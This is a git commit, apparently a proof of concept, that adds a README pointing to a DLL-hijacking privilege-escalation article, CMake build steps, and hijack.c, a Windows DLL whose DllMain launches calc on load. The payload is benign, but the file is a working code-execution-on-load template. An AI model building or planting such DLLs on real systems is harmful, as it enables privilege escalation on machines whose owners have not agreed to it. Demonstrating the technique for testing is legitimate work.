3b633c44c129c07ee19be5af585ec81fe8b499c9
Nathan Moinvaziri <nathan@solidstatenetworks.com>
2020-06-04 08:48:06 -0700

    Initial commit.

---
+++ README.md
@@ -0,0 +1,8 @@
+https://gracefulsecurity.com/privesc-dll-hijacking/
+
+## Build Instructions
+
+```
+cmake . -A Win32 -DBUILD_SHARED_LIBS=ON
+cmake --build . --config Release
+```
---
+++ hijack.c
@@ -0,0 +1,13 @@
+#include <windows.h>
+
+int fireLazor()
+{
+    WinExec("calc", 0);
+    return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+    fireLazor();
+    return 0;
+}
